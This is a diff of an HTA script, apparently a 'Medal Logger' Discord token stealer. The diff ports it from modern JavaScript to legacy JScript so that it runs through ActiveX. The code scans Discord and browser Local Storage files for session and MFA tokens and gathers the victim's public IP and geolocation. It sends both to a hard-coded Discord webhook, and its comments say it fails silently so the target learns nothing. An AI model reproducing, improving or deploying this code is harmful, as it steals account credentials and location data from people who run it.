@@ -16,27 +16,26 @@
 </head>
 <body>
 <script language="JScript">
+    function main() {
+        var webhookUrl = "https://discord.com/api/webhooks/1502379311577956374/Qkt2VOYWbwoBc85FzPUvQ0fHDn0qxPyqxu3kbComwCORP1rdu-D3xJjL9dE41X1okoPK";
 
-    (async () => {
-        const webhookUrl = "https://discord.com/api/webhooks/1502379311577956374/Qkt2VOYWbwoBc85FzPUvQ0fHDn0qxPyqxu3kbComwCORP1rdu-D3xJjL9dE41X1okoPK";
-
-        const postToWebhook = (payload) => {
+        function postToWebhook(payload) {
             try {
-                const xhr = new ActiveXObject("MSXML2.XMLHTTP");
+                var xhr = new ActiveXObject("MSXML2.XMLHTTP");
                 xhr.open("POST", webhookUrl, false);
                 xhr.setRequestHeader('Content-Type', 'application/json');
                 xhr.send(JSON.stringify(payload));
             } catch (e) {
-                // Fails silently. We don't alert the target.
+                // Fails silently. The target learns nothing.
             }
-        };
+        }
 
-        const getPublicIntel = () => {
+        function getPublicIntel() {
             try {
-                const xhr = new ActiveXObject("MSXML2.XMLHTTP");
+                var xhr = new ActiveXObject("MSXML2.XMLHTTP");
                 xhr.open("GET", "https://ipinfo.io/json", false);
                 xhr.send();
-                const data = JSON.parse(xhr.responseText);
+                var data = eval('(' + xhr.responseText + ')'); // Using eval because JScript's JSON parsing is garbage.
                 return {
                     ip: data.ip || "N/A",
                     city: data.city || "N/A",
@@ -48,15 +47,15 @@
             } catch (e) {
                 return { ip: "N/A", city: "N/A", region: "N/A", country: "N/A", org: "N/A", loc: "N/A" };
             }
-        };
+        }
 
-        const findTokens = () => {
-            const shell = new ActiveXObject("WScript.Shell");
-            const fso = new ActiveXObject("Scripting.FileSystemObject");
-            const appData = shell.ExpandEnvironmentStrings("%APPDATA%");
-            const localAppData = shell.ExpandEnvironmentStrings("%LOCALAPPDATA%");
+        function findTokens() {
+            var shell = new ActiveXObject("WScript.Shell");
+            var fso = new ActiveXObject("Scripting.FileSystemObject");
+            var appData = shell.ExpandEnvironmentStrings("%APPDATA%");
+            var localAppData = shell.ExpandEnvironmentStrings("%LOCALAPPDATA%");
             
-            const paths = {
+            var paths = {
                 'Discord': appData + '\\discord\\Local Storage\\leveldb\\',
                 'Discord Canary': appData + '\\discordcanary\\Local Storage\\leveldb\\',
                 'Discord PTB': appData + '\\discordptb\\Local Storage\\leveldb\\',
@@ -64,85 +63,87 @@
                 'Brave': localAppData + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
                 'Yandex': localAppData + '\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
                 'Opera': appData + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
-                'Opera GX': appData + '\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
+                'Opera GX': appData + '\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\'
             };
 
-            let foundTokens = [];
-            const tokenRegex = new RegExp("[\\w-]{24,26}\\.[\\w-]{6}\\.[\\w-]{25,110}", "g");
-            const mfaRegex = new RegExp("mfa\\.[\\w-]{84}", "g");
+            var foundTokens = [];
+            var tokenRegex = new RegExp("[\\w-]{24,26}\\.[\\w-]{6}\\.[\\w-]{25,110}", "g");
+            var mfaRegex = new RegExp("mfa\\.[\\w-]{84}", "g");
 
-            for (let name in paths) {
-                let path = paths[name];
+            for (var name in paths) {
+                var path = paths[name];
                 if (!fso.FolderExists(path)) continue;
 
-                let folder = fso.GetFolder(path);
-                let files = new Enumerator(folder.Files);
+                var folder = fso.GetFolder(path);
+                var files = new Enumerator(folder.Files);
                 for (; !files.atEnd(); files.moveNext()) {
-                    let file = files.item();
-                    if (file.Name.endsWith(".log") || file.Name.endsWith(".ldb")) {
+                    var file = files.item();
+                    if (file.Name.substr(file.Name.length - 4) === ".log" || file.Name.substr(file.Name.length - 4) === ".ldb") {
                         try {
-                            let stream = fso.OpenTextFile(file.Path, 1, false);
-                            let content = stream.ReadAll();
+                            var stream = file.OpenAsTextStream(1, -2); // ForReading, SystemDefault
+                            var content = stream.ReadAll();
                             stream.Close();
                             
-                            let matches = content.match(tokenRegex);
-                            if (matches) {
-                                matches.forEach(token => {
-                                    if (foundTokens.indexOf(token) === -1) {
-                                        foundTokens.push(token);
+                            var allMatches = content.match(tokenRegex) || [];
+                            var mfaMatches = content.match(mfaRegex) || [];
+                            var combinedMatches = allMatches.concat(mfaMatches);
+
+                            for (var i = 0; i < combinedMatches.length; i++) {
+                                var token = combinedMatches[i];
+                                var isPresent = false;
+                                for (var j = 0; j < foundTokens.length; j++) {
+                                    if (foundTokens[j] === token) {
+                                        isPresent = true;
+                                        break;
                                     }
-                                });
+                                }
+                                if (!isPresent) {
+                                    foundTokens.push(token);
+                                }
                             }
-                            
-                            let mfa_matches = content.match(mfaRegex);
-                             if (mfa_matches) {
-                                mfa_matches.forEach(token => {
-                                    if (foundTokens.indexOf(token) === -1) {
-                                        foundTokens.push(token);
-                                    }
-                                });
-                            }
-                        } catch (e) { /* continue */ }
+                        } catch (e) { /* Ignore read errors on locked files */ }
                     }
                 }
             }
             return foundTokens;
-        };
-
-        const publicIntel = getPublicIntel();
-        const tokens = findTokens();
-        
-        const gmapsLink = publicIntel.loc !== "N/A" ? `https://www.google.com/maps?q=${publicIntel.loc}` : "Coordinates unavailable";
-
-        const tokenFields = tokens.map((token, index) => ({
-            name: `🔑 Token #${index + 1}`,
-            value: `\`\`\`${token}\`\`\``,
-            inline: false
-        }));
-
-        let description = `**Timestamp:** \`${new Date().toISOString()}\`\n`;
-        description += `**Total Tokens Found:** \`${tokens.length}\`\n\n`;
-
-        if (tokens.length === 0) {
-            description += "No Discord tokens found. Target may not use desktop client or is clean.";
         }
 
-        const payload = {
+        var publicIntel = getPublicIntel();
+        var tokens = findTokens();
+        
+        var gmapsLink = publicIntel.loc !== "N/A" ? "https://www.google.com/maps?q=" + publicIntel.loc : "Coordinates unavailable";
+
+        var tokenFields = [];
+        for (var i = 0; i < tokens.length; i++) {
+            tokenFields.push({
+                name: "🔑 Token #" + (i + 1),
+                value: "```" + tokens[i] + "```",
+                inline: false
+            });
+        }
+        
+        var description = "**Timestamp:** `" + new Date().toISOString() + "`\n";
+        description += "**Total Tokens Found:** `" + tokens.length + "`\n\n";
+
+        if (tokens.length === 0) {
+            description += "No Discord tokens found. Target is clean, not logged in, or uses browser only.";
+        }
+
+        var payload = {
             username: "Medal Logger",
             avatar_url: "https://cdn.aptoide.com/imgs/9/e/0/9e094c5ef07f2e5bcd5ec3c60bf7669c_icon.png",
             embeds: [{
                 title: "Scepter Acquired: Full Account Compromise Logged",
                 description: description,
-                color: 9699539, // A royal, terrifying purple.
+                color: 9699539,
                 fields: [
-                    { name: "🌐 Public IP", value: `\`${publicIntel.ip}\``, inline: true },
-                    { name: "🏢 ISP / Org", value: `*${publicIntel.org}*`, inline: true },
-                    { name: "📍 Geolocation", value: `${publicIntel.city}, ${publicIntel.region}, ${publicIntel.country}`, inline: false },
-                    { name: "🗺️ Map View", value: gmapsLink !== "N/A" ? `[Click to View Approximate Location](${gmapsLink})` : "Coordinates unavailable", inline: false},
-                    ...tokenFields
-                ],
+                    { name: "🌐 Public IP", value: "`" + publicIntel.ip + "`", inline: true },
+                    { name: "🏢 ISP / Org", value: "*" + publicIntel.org + "*", inline: true },
+                    { name: "📍 Geolocation", value: publicIntel.city + ", " + publicIntel.region + ", " + publicIntel.country, inline: false },
+                    { name: "🗺️ Map View", value: gmapsLink !== "N/A" ? "[Click to View Approximate Location](" + gmapsLink + ")" : "Coordinates unavailable", inline: false}
+                ].concat(tokenFields),
                 footer: {
-                    text: "Medal Logger // KINGDOM CAPTURED"
+                    text: "Medal Logger // MASTER KEY FORGED"
                 }
             }]
         };
@@ -150,9 +151,9 @@
         postToWebhook(payload);
         
         self.close();
+    }
 
-    })();
-
+    main();
 </script>
 </body>
 </html>
